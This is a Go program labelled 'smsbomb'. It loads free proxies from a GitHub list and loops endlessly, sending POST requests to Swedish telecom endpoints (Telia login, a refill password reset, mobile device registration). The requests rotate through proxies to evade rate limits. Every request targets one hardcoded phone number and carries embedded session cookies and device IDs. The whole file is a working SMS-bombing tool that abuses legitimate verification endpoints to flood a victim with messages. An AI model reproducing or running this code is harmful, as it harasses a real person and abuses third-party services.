package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
)

func main() {

	// Ensure there are proxies available

	fmt.Println("loading sms :: atomic/scripts/smsbomb")
	for {
		StartALL()
		time.Sleep(time.Microsecond * 1)
	}
}

var proxyList = fetchProxies("https://raw.githubusercontent.com/Jakee8718/Free-Proxies/main/proxy/http.txt")

func fetchProxies(uri string) []string {
	resp, err := http.Get(uri)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func StartALL() {
	var wg sync.WaitGroup // New wait group
	wg.Add(3)             // Using two goroutines

	go Telia1(&wg)
	go Laddkod(&wg)
	go ProdMobil2(&wg)

}
func Telia1(wg *sync.WaitGroup) {
	defer wg.Done()

	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint

	proxy := proxyList[rand.Intn(len(proxyList))]

	data := `{"identifier": "46706505038"}` // Fixed the JSON formatting issue

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	client := &fasthttp.Client{
		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
	}

	err := client.Do(req, resp)
	if err != nil {

	} else {
		fmt.Println("[" + url + "] - [" + strconv.Itoa(resp.StatusCode()) + "] :: " + proxy)

	}

}
func Laddkod(wg *sync.WaitGroup) {
	defer wg.Done()

	url := "https://teliase.smartrefill.se/Refill/api/TELIA/v1/passwords/0706505038" // Replace with your API endpoint

	proxy := proxyList[rand.Intn(len(proxyList))]

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)
	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)

	client := &fasthttp.Client{
		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
	}

	err := client.Do(req, resp)
	if err != nil {

	} else {
		fmt.Println("[" + url + "] - [" + strconv.Itoa(resp.StatusCode()) + "] :: " + proxy)

	}
}
func ProdMobil2(wg *sync.WaitGroup) {
	defer wg.Done()

	url := "https://prod2.mobill.se/mspRequest" // Replace with your API endpoint

	proxy := proxyList[rand.Intn(len(proxyList))]

	data := `{"hash":"Mqu2VBd7S9Tf3lQ74PogIytnuiw=","clientId":"4a458cd7-b311-4676-b479-00f3ec583a93","messageService":"APP","messageType":"REGISTER_DEVICE_REQUEST","message":"{\"msisdn\":\"46706505038\",\"deviceId\":\"9f065f6d979246ed81c63cfe4fbaef39\",\"companyCode\":\"MP\",\"requestId\":null,\"deviceKey\":null,\"userId\":null,\"platform\":\"iOS\",\"osVersion\":\"16.2.0\",\"appVersionNumber\":\"1.4.33\",\"appBuildNumber\":\"2023.10.09.1\"}","requestId":null,"synchronous":true}` // Fixed the JSON formatting issue

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	client := &fasthttp.Client{
		Dial: fasthttpproxy.FasthttpHTTPDialer(proxy),
	}

	err := client.Do(req, resp)
	if err != nil {

	} else {
		fmt.Println("[" + url + "] - [" + strconv.Itoa(resp.StatusCode()) + "] :: " + proxy)

	}

}
